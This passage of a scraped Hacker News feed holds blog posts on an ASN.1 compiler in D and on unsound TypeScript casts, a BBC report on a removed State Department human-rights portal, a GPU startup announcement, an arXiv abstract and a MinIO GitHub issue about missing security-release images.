knows that each and every milestone has been so extremely rewarding (as long as I try not to think about the fact that almost no one will be using this code).&lt;/p&gt;&lt;p&gt;p.s. Don’t try to make a template-based parser combinator for the entire grammar of a language you don’t personally control unless you want to see symbol names that are 10Mb+ long and explode the binary size by over 100Mb. Don’t ask me how I know.&lt;/p&gt;&lt;p&gt;(I even hard crashed the D compiler I use once, since I guess the error message was literally too long. That endlessly scrolling console…)&lt;/p&gt;&lt;p&gt;A probably wasted year of my life later and there’s still an insane amount of work left on everything relating to this project (and Juptune) in general, but I think it’s making me a better programmer. Maybe.&lt;/p&gt;&lt;p&gt;The dream is that one day I can put “made an ASN.1 compiler + x.509 certificate handler + TLS 1.3 implementation” on my CV and still get told “sorry, you’re a good match except you don’t have 6 months of production experience in Ansible, we can’t hire you” by a recruiter. God I love this industry.&lt;/p&gt;&lt;p&gt;Don’t do ASN.1 kids, you’ll never be the same.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://bradley.chatha.dev/blog/dlang-propaganda/asn1-compiler-in-d/"/><published>2025-10-23T12:47:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45681547</id><title>Unconventional Ways to Cast in TypeScript</title><updated>2025-10-23T17:37:16.411906+00:00</updated><content>&lt;doc fingerprint="aa50ba206a0d06d8"&gt;
  &lt;main&gt;
    &lt;p&gt;I saw a post by qntm and remembered I had a playground with a similar idea. I then expanded that playground into a (probably non-exhaustive) list of ways to cast between arbitrary1 types in Typescript:&lt;/p&gt;
    &lt;head rend="h2"&gt;Convention: The &lt;code&gt;as&lt;/code&gt; Operator&lt;/head&gt;
    &lt;p&gt;Ah, good ol' &lt;code&gt;as&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;const cast = &amp;lt;A, B,&amp;gt;(a: A): B =&amp;gt; a as unknown as B;&lt;/code&gt;
    &lt;p&gt;We can't just directly do &lt;code&gt;a as B&lt;/code&gt; because Typescript is smart enough to warn us about that, at least. That very same error message also says,&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;If this was intentional, convert the expression to 'unknown' first.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;So we can just do that :3&lt;/p&gt;
    &lt;p&gt;If we were approaching this from a type theoretic perspective, it's already done &amp;amp; dusted, we have the most cut-and-dry demonstration of unsoundness, pack it up go home.&lt;/p&gt;
    &lt;p&gt;But, what if we couldn't use &lt;code&gt;as&lt;/code&gt;? Can we still get between two completely unrelated types?&lt;/p&gt;
    &lt;head rend="h2"&gt;Unconvention 1: The &lt;code&gt;is&lt;/code&gt; Operator&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;is&lt;/code&gt; is commonly used for for interfacing with Typescript's flow-typing system, helping it figure out what exactly the return value of a boolean function means. For example:&lt;/p&gt;
    &lt;code&gt;const notUndefined1 = &amp;lt;A,&amp;gt;(a: A | undefined): boolean =&amp;gt; a !== undefined;
const notUndefined2 = &amp;lt;A,&amp;gt;(a: A | undefined): a is A =&amp;gt; a !== undefined;

const maybeNumber0: number | undefined = someExternalFunction();
if (maybeNumber0 !== undefined) return;
// Thanks to flow-typing, Typescript knows that `maybeNumber0: number`
// if we get here.
const maybeNumber1 = someExternalFunction();
if (notUndefined1(maybeNumber1)) return;
// However, Typescript cannot infer flow from ordinary functions;
// At this point, it still thinks `maybeNumber1: number | undefined`
const maybeNumber2 = someExternalFunction();
if (notUndefined2(maybeNumber2)) return;
// The `is` annotation has the exact same `boolean` value at runtime,
// but provides extra information to the compiler, so Typescript can know
// that `maybeNumber2: number` if we get here.&lt;/code&gt;
    &lt;p&gt;However, &lt;code&gt;is&lt;/code&gt; is sort of an escape hatch outside the regular typing system, and we can abuse it to tell the compiler whatever we want:&lt;/p&gt;
    &lt;code&gt;const badDetector = &amp;lt;A, B,&amp;gt;(a: A): B =&amp;gt; {
    const detector = (_ab: A | B): _ab is B =&amp;gt; true;
    if (detector(a)) return a;
    throw new Error("unreachable");
};&lt;/code&gt;
    &lt;p&gt;Typescript doesn't (and can't!) check that the function body is actually doing what the &lt;code&gt;is&lt;/code&gt; assertion says. So we can just write a bad one on purpose! (Or on accident, introducing quite a subtle bug.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Unconvention 2: Mutation Across Boundaries&lt;/head&gt;
    &lt;p&gt;This cast requires a "seed" value &lt;code&gt;b: B&lt;/code&gt; in order to be able to cast &lt;code&gt;a: A&lt;/code&gt; to &lt;code&gt;B&lt;/code&gt;, but make no mistake: this sort of thing can come up fairly often if we're not careful about how we mutate objects.&lt;/p&gt;
    &lt;code&gt;const mutation = &amp;lt;A, B,&amp;gt;(a: A, b: B): B =&amp;gt; {
    const mutate = (obj: { field: A | B }): void =&amp;gt; {
        obj.field = a;
    };

    const obj = { field: b };
    mutate(obj);
    return obj.field;
};&lt;/code&gt;
    &lt;p&gt;I showed this to a type theory friend and their reaction was:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;bruh ts type system mega fails Variance is hard xd xd xd&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;What they meant by that was, the coercion from &lt;code&gt;{ field: B }&lt;/code&gt; to &lt;code&gt;{ field: A | B }&lt;/code&gt; is unsafe when the destination &lt;code&gt;field&lt;/code&gt; is mutable; if we allow it, we get exactly the behavior shown here. To make it safe we'd need &lt;code&gt;{ readonly field: A | B }&lt;/code&gt;, which then prevents the mutation.&lt;/p&gt;
    &lt;p&gt;Another way of thinking about this is, Typescript currently has no way to "flow" the cast of/assignment to &lt;code&gt;obj.field&lt;/code&gt; after the function runs. (Potentially on purpose, because that would make the type system even more complex &amp;amp; limit certain useful patterns.) Inlining the &lt;code&gt;obj.field = a;&lt;/code&gt; allows us to catch this, but the analysis does not go across function boundaries.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unconvention 3: Smuggling Through Structural Typing&lt;/head&gt;
    &lt;p&gt;Typescript is structurally typed. This means that, if we have an &lt;code&gt;obj: { field: string }&lt;/code&gt;, all we know is that there exists an &lt;code&gt;obj.field: string&lt;/code&gt;. Typescript doesn't care at all if &lt;code&gt;obj&lt;/code&gt; has other fields, and in fact this is the biggest advantage of structural typing: we can freely "upcast" to less restrictive types (i.e. fewer fields) without having to change runtime representations.&lt;/p&gt;
    &lt;p&gt;The downside of this sort of upcasting is that, some operations like &lt;code&gt;Object.values&lt;/code&gt;/the spread operator are only properly typed when they have a complete list of fields, and have their assumptions violated when extra fields are in the mix:&lt;/p&gt;
    &lt;code&gt;const loopSmuggling = &amp;lt;A, B,&amp;gt;(a: A, b: B): B =&amp;gt; {
    const objAB = { fieldA: a, fieldB: b };
    const objB: { fieldB: B } = objAB;
    for (const field of Object.values(objB)) {
        // Object.values believes all fields have type `B`,
        // but actually `fieldA` is first in iteration order.
        return field;
    }
    throw new Error("unreachable");
};

const spreadSmuggling = &amp;lt;A, B,&amp;gt;(a: A, b: B): B =&amp;gt; {
    const objA = { field: a };
    const obj: {} = objA;
    const objB = { field: b, ...obj };
    // `objB.field` has been overwritten by the spread,
    // but Typescript doesn't know that.
    return objB.field;
};&lt;/code&gt;
    &lt;p&gt;These casts have the same restriction as (2), in that we require a "seed" value &lt;code&gt;b: B&lt;/code&gt; in order to make it typecheck. Still, it's a bit of a double-whammy, because trying to avoid (2) by copying objects with a &lt;code&gt;...&lt;/code&gt; spread can make you run smack-dab into this one elsewhere.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unconvention 4: &lt;code&gt;| void&lt;/code&gt; is Very Bad&lt;/head&gt;
    &lt;p&gt;This one's by far the most unconventional; the rest you're probably aware of if you've worked with Typescript for a while, but this one hardly ever comes up because it's such a "why even do this" kinda deal. Still, I have seen it in my work's codebase (and immediately excised it once I realized), so it's not impossible to come across.&lt;/p&gt;
    &lt;p&gt;Anyways here it is:&lt;/p&gt;
    &lt;code&gt;const orVoid = &amp;lt;A, B,&amp;gt;(a: A): B =&amp;gt; {
    const outer = (inner: () =&amp;gt; B | void): B =&amp;gt; {
        const b = inner();
        if (b) return b;
        throw new Error("falsy");
    };

    const returnsA = (): A =&amp;gt; a;
    const voidSmuggled: () =&amp;gt; void = returnsA;
    return outer(voidSmuggled);
};&lt;/code&gt;
    &lt;p&gt;This is a combination of a few interesting things. For Typescript, &lt;code&gt;void&lt;/code&gt; is primarily seen as a function's return value, indicating "I don't care what this function returns because I'm not going to use it". This is why any function, including our &lt;code&gt;() =&amp;gt; A&lt;/code&gt; one, can be safely coerced to &lt;code&gt;() =&amp;gt; void&lt;/code&gt;. Usually, this is safe, because once we have a &lt;code&gt;() =&amp;gt; void&lt;/code&gt;, we really can't assign its output to a variable, nor can we directly type a value as &lt;code&gt;void&lt;/code&gt;; it's a very special type after all.&lt;/p&gt;
    &lt;p&gt;However, &lt;code&gt;void&lt;/code&gt; can still participate in type combinations like &lt;code&gt;B | void&lt;/code&gt;. And, because functions are covariant in their return type, &lt;code&gt;() =&amp;gt; void&lt;/code&gt; can be safely coerced to &lt;code&gt;() =&amp;gt; B | void&lt;/code&gt;. And, as it turns out, we can assign that &lt;code&gt;B | void&lt;/code&gt; return type to a variable!&lt;/p&gt;
    &lt;p&gt;If &lt;code&gt;void&lt;/code&gt; were meant to be assigned directly, it should behave something more like &lt;code&gt;any&lt;/code&gt; or &lt;code&gt;unknown&lt;/code&gt;. But it's not, so instead it behaves like a falsy type, because a normal &lt;code&gt;void&lt;/code&gt;-returning function actually returns &lt;code&gt;undefined&lt;/code&gt; at runtime. This is how we're able to &lt;code&gt;if (b) return b;&lt;/code&gt; (which is not the same as checking &lt;code&gt;b&lt;/code&gt;'s true type!) &amp;amp; still have everything typecheck.&lt;/p&gt;
    &lt;p&gt;Unfortunately, that means this cast only works for truthy &lt;code&gt;a&lt;/code&gt;. But that's not too much of an issue I think, the Cool Factor outweighs this limitation :3&lt;/p&gt;
    &lt;head rend="h2"&gt;Does This Even Matter?&lt;/head&gt;
    &lt;p&gt;Yes, but it's complicated.&lt;/p&gt;
    &lt;p&gt;On the one hand, Typescript is clearly just a "best effort" at adding types to Javascript, and it does a darn good job at that. If you're holding it right, these things don't come up, and your code genuinely is much much safer than if you used raw Javascript.&lt;/p&gt;
    &lt;p&gt;On the other hand, all these "unconventions" are real footguns one can stumble into &amp;amp; unintentionally introduce unsafety into your codebase. It only takes a little bit of unsoundness in one place to render entire swaths buggy. We can do our best to avoid these patterns manually, but an automated solution will always be better at catching them.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Can We Do About This?&lt;/head&gt;
    &lt;p&gt;TL;DR use typescript-eslint2. While neither Typescript3 nor Eslint4 on their own come with enough rules to detect any of these, the typescript-eslint ruleset includes things like @typescript-eslint/prefer-readonly-parameter-types (prevents (2)), @typescript-eslint/no-invalid-void-type (prevents (4)), &amp;amp; @typescript-eslint/no-unnecessary-type-parameters (prevents the rest by making the &lt;code&gt;unknown&lt;/code&gt; viral). Unfortunately, all of them are opt-in, and Typescript + eslint + typescript-eslint always requires a fair bit of mucking about to get working.&lt;/p&gt;
    &lt;p&gt;Anyways, I hope these examples are enough to convince you to use more aggressive linting on your Typescript projects in the future :3&lt;/p&gt;
    &lt;head rend="h2"&gt;Footnotes&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;OK, I may have over-exaggerated on the "arbitrary" part a little :P (1) and (2) do in fact work for everything, but (3) doesn't work for&lt;/p&gt;&lt;code&gt;undefined&lt;/code&gt;sometimes and (4) only works if the&lt;code&gt;a&lt;/code&gt;to be cast is truthy. Still, it's a good enough demonstration I think. ↩&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://wolfgirl.dev/blog/2025-10-22-4-unconventional-ways-to-cast-in-typescript/"/><published>2025-10-23T13:25:02+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45682122</id><title>Show HN: Nostr Web – decentralized website hosting on Nostr</title><updated>2025-10-23T17:37:16.242825+00:00</updated><content>&lt;doc fingerprint="c90cece838037164"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Extension Required&lt;/head&gt;
    &lt;p&gt;This site is available on the decentralized web via Nostr. Install the Nostr Web browser extension to view it.&lt;/p&gt;
    &lt;p&gt;For manual installation or other browsers, visit GitHub.&lt;/p&gt;
    &lt;p&gt;This site is available on the decentralized web via Nostr. Install the Nostr Web browser extension to view it.&lt;/p&gt;
    &lt;p&gt;For manual installation or other browsers, visit GitHub.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://nweb.shugur.com"/><published>2025-10-23T14:20:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45682169</id><title>US axes website for reporting human rights abuses by US-armed foreign forces</title><updated>2025-10-23T17:37:16.087019+00:00</updated><content>&lt;doc fingerprint="fa44998e317b5382"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;US axes website for reporting human rights abuses by US-armed foreign forces&lt;/head&gt;
    &lt;p&gt;The US State Department has removed an online portal for reporting alleged human rights violations by foreign military units supplied with American weapons.&lt;/p&gt;
    &lt;p&gt;The Human Rights Reporting Gateway (HRG) acted as a formal "tip line" to the US government.&lt;/p&gt;
    &lt;p&gt;It was the only publicly accessible channel of its kind for organisations or individuals to inform it directly of potentially serious abuses by US-armed foreign forces.&lt;/p&gt;
    &lt;p&gt;Its deletion has been condemned by human rights campaigners and by a senior congressional aide who drafted the law requiring it. The State Department insisted it was still abiding by the law.&lt;/p&gt;
    &lt;p&gt;The portal was established in 2022 following pressure on successive administrations to abide by updated provisions of the Leahy Law, named after former US Senator Patrick Leahy. These require the government to "facilitate receipt" of information on alleged gross violations of human rights by military units supplied by Washington.&lt;/p&gt;
    &lt;p&gt;Among the cases submitted via the HRG was the alleged excessive use of force by security forces during anti-government protests in Colombia, while several cases were due to be submitted relating to US-armed units of the Israel Defense Forces (IDF) in the occupied West Bank, according to Amnesty International.&lt;/p&gt;
    &lt;p&gt;Tim Rieser, former senior aide to Senator Leahy who wrote the 2011 amendment mandating information gathering, told the BBC the gateway's removal meant the State Department was "clearly ignoring the law".&lt;/p&gt;
    &lt;p&gt;He added it was a further sign that "the entire human rights architecture" within the department was being "rendered largely ineffective".&lt;/p&gt;
    &lt;p&gt;"The United States will find itself supporting foreign security forces that commit heinous crimes even though nothing is done about it," said Mr Rieser. "As a result there will be less incentive for foreign governments to bring people who commit such crimes to justice."&lt;/p&gt;
    &lt;p&gt;In response, the US State Department insisted it was continuing to receive reports regarding gross violations of human rights and was engaging with "credible organisations" on a full spectrum of human rights concerns. It said: "The Department abides by its legal requirements".&lt;/p&gt;
    &lt;p&gt;Secretary of State Marco Rubio has overseen a sweeping reorganisation of the State Department involving widespread layoffs and eliminating some offices focused on human rights monitoring. The department this year released a slimmed-down annual human rights report which critics said omitted alleged crimes by US allies but included those by foreign leaders the Trump administration opposes.&lt;/p&gt;
    &lt;p&gt;The department has previously said its restructure made it leaner and more efficient and followed President Trump's "America First" foreign policy which sees some human rights promotion as ideologically driven.&lt;/p&gt;
    &lt;p&gt;Charles Blaha, former Director of the Office of Security and Human Rights at the State Department, said people in the field would now have "no established channel" for reporting gross violations of human rights by foreign security forces.&lt;/p&gt;
    &lt;p&gt;The government's ability to deter abuses was "severely weakened", said Mr Blaha who is now an adviser to the Washington-based think tank Democracy for the Arab World Now (DAWN).&lt;/p&gt;
    &lt;p&gt;The BBC learned during the summer that the HRG site was earmarked for deletion. Its removal was highlighted by DAWN in August but has not previously been acknowledged by the State Department. The BBC confirmed this week that officials phased out the reporting channel during the department's restructure.&lt;/p&gt;
    &lt;p&gt;Screengrabs of the portal taken by the BBC before its deletion show it asked for information on US-armed foreign military units involved in alleged abuses including extrajudicial killings, forced disappearances, torture and rape. It required extensive details to ensure credible reporting including unit names, identities of alleged perpetrators, specific locations and dates.&lt;/p&gt;
    &lt;p&gt;Blaha had already voiced frustration that despite the HRG passing its pilot phase, the Biden administration had not done enough to publicise it, meaning the provision to "facilitate receipt" of information was still not being fully honoured before the Trump administration deleted the channel entirely.&lt;/p&gt;
    &lt;p&gt;The US is the world's biggest contributor of military aid to foreign countries, supplying funding, equipment, training and arms to more than 150 nations. Its vetting procedures to prevent arms going to units involved in breaches of international law have evolved over the years, with the 1997 legislation named after Senator Leahy being one its major pillars.&lt;/p&gt;
    &lt;p&gt;At the heart of the law is Congress sending a message to the administration that taxpayer funding cannot support human rights abuses abroad, says Amanda Klasing, who oversees government relations at Amnesty International USA.&lt;/p&gt;
    &lt;p&gt;"If I'm a member of Congress, my perspective is: 'I want to protect my constituents and their taxpayer funding from going to torturers or people that kill their own citizens for protesting," she told the BBC.&lt;/p&gt;
    &lt;p&gt;Klasing oversaw the compilation and submission of several reports to the Human Rights Reporting Gateway.&lt;/p&gt;
    &lt;p&gt;These included allegations that American arms were used by Colombian security forces during mass anti-government protests in 2021, in which at least 47 people were killed and many wounded according to the group. Amnesty says among the arms were US-supplied high-capacity launchers for stun and smoke grenades.&lt;/p&gt;
    &lt;p&gt;Klasing says she had also gathered evidence relating to the killing of 20 Palestinians during IDF raids in occupied East Jerusalem and the West Bank in October and November 2023. Amnesty was preparing to submit its report on these incidents to the HRG before its deletion.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/news/articles/cqx30vnwd4do"/><published>2025-10-23T14:25:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45683153</id><title>VectorWare – from creators of `rust-GPU` and `rust-CUDA`</title><updated>2025-10-23T17:37:15.871076+00:00</updated><content>&lt;doc fingerprint="c52b513bd8972d5d"&gt;
  &lt;main&gt;
    &lt;p&gt;We are building the first GPU-native software company. Today we are sharing the thesis, people, and partners behind it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Our thesis&lt;/head&gt;
    &lt;p&gt;Technology shifts happen gradually, then suddenly. We are in the suddenly part. New technologies like LLMs, generative AI, self-driving cars, drones, AR/VR, and robots are reshaping the world. But they are not the technology shift. They are the new applications enabled by it. The real shift is from CPU to GPU.&lt;/p&gt;
    &lt;p&gt;The importance of CPUs and GPUs has inverted. To compete, CPUs are adding GPU features while GPUs are adding CPU features. CPUs and GPUs are converging.&lt;/p&gt;
    &lt;p&gt;Software has not kept pace. CPU software is advanced, standardized, and familiar. GPU software is primitive, bespoke, and weird. Most programmers still focus on the CPU.&lt;/p&gt;
    &lt;p&gt;We believe we are at the start of a new software industry. We intend to lead it.&lt;/p&gt;
    &lt;head rend="h2"&gt;GPU-native software&lt;/head&gt;
    &lt;p&gt;There are two broad classes of applications:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GPU applications such as AI, computer vision, machine learning, scientific simulations, and graphics. These require GPUs and are driving most demand, investment, and improvements in compute hardware today.&lt;/item&gt;
      &lt;item&gt;CPU applications, which includes nearly everything else.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you look at existing GPU applications, their software implementations aren't truly GPU-native. Instead, they are architected as traditional CPU software with a GPU add-on. For example, &lt;code&gt;pytorch&lt;/code&gt; uses the CPU by default and GPU acceleration is
opt-in. Even after opting in, the CPU is in control and orchestrates work on the GPU.
Furthermore, if you look at the software kernels that run on the GPU they are simplistic
with low cyclomatic complexity. This
is not unique to &lt;code&gt;pytorch&lt;/code&gt;. Most software is CPU-only, a small subset is GPU-aware, an
even smaller subset is GPU-only, and no software is GPU-native.&lt;/p&gt;
    &lt;p&gt;We are building software that is GPU-native. We intend to put the GPU in control. This does not happen today due to the difficulty of programming GPUs, the immaturity of GPU software and abstractions, and the relatively few developers targeting GPUs.&lt;/p&gt;
    &lt;p&gt;With the advent of GPU databases, we are just starting to see CPU-based applications migrate to GPUs. As CPUs and GPUs converge, we believe that all software will begin to leverage GPUs to varying degrees. This is a huge opportunity.&lt;/p&gt;
    &lt;p&gt;At VectorWare we are excited to focus on both improving GPU applications and migrating CPU applications to the GPU. We are building supporting tools and a new low-level software stack to make GPU-native software a reality.&lt;/p&gt;
    &lt;p&gt;Think of us like:&lt;/p&gt;
    &lt;p&gt;New hardware platform&lt;/p&gt;
    &lt;p&gt;New hardware platform&lt;/p&gt;
    &lt;p&gt;Killer app making the new hardware ubiquitous&lt;/p&gt;
    &lt;p&gt;Killer app making the new hardware ubiquitous&lt;/p&gt;
    &lt;p&gt;Creates platforms, apps, and developer tools for the ubiquitous hardware&lt;/p&gt;
    &lt;p&gt;Creates platforms, apps, and developer tools for the ubiquitous hardware&lt;/p&gt;
    &lt;head rend="h2"&gt;Who we are&lt;/head&gt;
    &lt;p&gt;Our company is comprised of Rust compiler team members, open source maintainers of &lt;code&gt;rust-gpu&lt;/code&gt;,
&lt;code&gt;rust-cuda&lt;/code&gt;, and
&lt;code&gt;rustc_codegen_clr&lt;/code&gt;, as well as
graphics experts from the gaming industry. In the past we've worked on everything from
operating systems at Apple, browsers at Mozilla, web and mobile apps at Facebook, and
graphics technology at Embark Studios and Frozenbyte. We've led developer tools and
infrastructure teams and even built our own
IDE
long before similar tools became billion-dollar AI companies. You can read more about us
on our team page.&lt;/p&gt;
    &lt;p&gt;We had overwhelming interest from investors and a heavily oversubscribed seed round. Ultimately, we chose to raise a smaller amount from people we know well and have worked with at previous companies. We met Dan Portillo, co-founder of The General Partnership, while working at Mozilla and are thrilled to have him as our lead investor. Our angel investors include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;John Lilly, an experienced investor, operator, and leader. We worked with him at Mozilla where he was the CEO.&lt;/item&gt;
      &lt;item&gt;Patrick Kavanagh, one of the first angel investors in Robinhood and an early investor in hot AI startups such as Manus and Plaud. We worked with him at Robinhood where he was the head of international and crypto.&lt;/item&gt;
      &lt;item&gt;Nick Candito, a career entrepreneur who has seen three early-stage ventures scale to nearly $900M in acquisition value and has been part of over 300 private investments ($75M allocated, ~20 unicorns, 15+ exits, 10 funds). We met him when he was founding Progressly (later acquired by Box).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These folks are experienced investors as well as founders and operators who understand the challenges of building. We're grateful they chose to invest their time and money in us.&lt;/p&gt;
    &lt;head rend="h2"&gt;We're hiring&lt;/head&gt;
    &lt;p&gt;We are growing our early team and are hiring for a few key roles.&lt;/p&gt;
    &lt;head rend="h3"&gt;GPU-native application engineering&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Goal: Ship GPU-native applications and build the missing abstractions that make them feel ordinary. Write "X for the GPU" where X is virtually any application.&lt;/item&gt;
      &lt;item&gt;Ideal background: Rust expertise plus experience with GPUs (CUDA, Vulkan, ROCm, CANN) and/or machine learning. Alternatively, the creator or maintainer of widely used Rust software with an interest in learning about GPUs.&lt;/item&gt;
      &lt;item&gt;Also welcome: GPU or ML experts who want to learn Rust.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Compiler engineering &amp;amp; language design&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Goal: Shape the low-level stack and language features that keep GPU-native software safe, performant, ergonomic, and reusable.&lt;/item&gt;
      &lt;item&gt;Ideal background: Contributor to the Rust compiler, preferably including wasm, Cranelift, or LLVM. Or experience writing implementations of other languages or emulators in Rust.&lt;/item&gt;
      &lt;item&gt;Also welcome: Language or tooling experts (wasm, Triton, LLVM, MLIR, Mojo, shader compilers) ready to learn Rust.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Userland graphics engineering&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Goal: Modify the graphics stack that GPU-native applications depend on to improve the safety, performance, ergonomics, and reusability of GPU-native applications. This includes APIs like Vulkan, plus stacks such as Mesa, DRM, Wayland, llvmpipe, MoltenVK, and KosmicKrisp.&lt;/item&gt;
      &lt;item&gt;Ideal background: Rust and graphics experience with a deep understanding of GPU APIs and architectures or compatibility layers.&lt;/item&gt;
      &lt;item&gt;Also welcome: Graphics engineers who want to learn Rust.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Linux kernel engineering&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Goal: Push the OS to better support GPU-native applications, improving safety, performance, ergonomics, and reusability from the kernel up when running in the datacenter.&lt;/item&gt;
      &lt;item&gt;Ideal background: Linux kernel developers working on Rust-based graphics, storage, or networking drivers. Working directly on Rust for Linux would be great too.&lt;/item&gt;
      &lt;item&gt;Also welcome: Seasoned Linux kernel engineers who want to learn Rust and GPUs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For more information and to get in touch, please visit our jobs page.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.vectorware.com/blog/announcing-vectorware/"/><published>2025-10-23T15:41:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45683897</id><title>Antislop: A framework for eliminating repetitive patterns in language models</title><updated>2025-10-23T17:37:15.635849+00:00</updated><content>&lt;doc fingerprint="3c1c3503d5f3928b"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Computer Science &amp;gt; Machine Learning&lt;/head&gt;&lt;p&gt; [Submitted on 16 Oct 2025 (v1), last revised 21 Oct 2025 (this version, v2)]&lt;/p&gt;&lt;head rend="h1"&gt;Title:Antislop: A Comprehensive Framework for Identifying and Eliminating Repetitive Patterns in Language Models&lt;/head&gt;View PDF&lt;quote&gt;Abstract:Widespread LLM adoption has introduced characteristic repetitive phraseology, termed "slop," which degrades output quality and makes AI-generated text immediately recognizable. We present Antislop, a comprehensive framework providing tools to both detect and eliminate these overused patterns. Our approach combines three innovations: (1) The Antislop Sampler, which uses backtracking to suppress unwanted strings at inference time without destroying vocabulary; (2) An automated pipeline that profiles model-specific slop against human baselines and generates training data; (3) Final Token Preference Optimization (FTPO), a novel fine-tuning method that operates on individual tokens, surgically adjusting logits wherever a banned pattern has appeared in an inference trace. We demonstrate that some slop patterns appear over 1,000x more frequently in LLM output than human text. The Antislop Sampler successfully suppresses 8,000+ patterns while maintaining quality, whereas token banning becomes unusable at just 2,000. Most importantly, FTPO achieves 90% slop reduction while maintaining or improving performance in cross-domain evals including GSM8K, MMLU, and creative writing tasks. In contrast, DPO suffers significant degradation in writing quality and lexical diversity despite achieving weaker suppression. We release all code and results under MIT license: this https URL.&lt;/quote&gt;&lt;head rend="h2"&gt;Submission history&lt;/head&gt;From: Samuel Paech [view email]&lt;p&gt;[v1] Thu, 16 Oct 2025 18:22:22 UTC (536 KB)&lt;/p&gt;&lt;p&gt;[v2] Tue, 21 Oct 2025 21:42:07 UTC (536 KB)&lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;p&gt; IArxiv Recommender (What is IArxiv?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arxiv.org/abs/2510.15061"/><published>2025-10-23T16:36:05+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45684035</id><title>MinIO declines to release Docker builds resolving CVE-2025-62506</title><updated>2025-10-23T17:37:14.796582+00:00</updated><content>&lt;doc fingerprint="77f8c2f5102ec21c"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Notifications &lt;tool-tip&gt;You must be signed in to change notification settings&lt;/tool-tip&gt;&lt;/item&gt;
      &lt;item&gt;Fork 6.3k&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Closed&lt;/p&gt;
    &lt;head rend="h2"&gt;Description&lt;/head&gt;
    &lt;p&gt;Hello,&lt;/p&gt;
    &lt;p&gt;I did not find a new image for the security release &lt;code&gt;Security/CVE RELEASE.2025-10-15T17-29-55Z&lt;/code&gt;, on quay.io nor DockerHub.&lt;/p&gt;
    &lt;p&gt;Is it expected? If it isn’t, can you please push a new release for this installation method?&lt;/p&gt;
    &lt;p&gt;Thank you.&lt;/p&gt;
